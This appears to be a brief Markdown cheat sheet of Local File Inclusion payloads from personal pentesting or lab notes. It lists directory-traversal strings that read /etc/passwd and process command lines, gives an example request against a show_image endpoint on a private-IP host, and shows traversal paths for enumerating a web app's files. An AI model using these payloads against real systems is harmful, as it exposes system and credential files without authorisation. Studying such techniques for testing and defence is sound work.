# Local File Inclusion

Payloads

```bash
/etc/passwd
```

Show command used to run the process

```bash
/proc/{PID}/cmdline
```

```
../../../../../../etc/passwd
```

<pre><code>http://10.10.11.204:8080/show_image?img=<a data-footnote-ref href="#user-content-fn-1">../../../../../../etc/passwd</a>
</code></pre>



Enumerate filesystem

```
../../../../../../var/www
```

```
 ../../../../../../var/www/WebApp
```

```
 ../../../../../../var/www/WebApp/pom.xml
```

[^1]: 
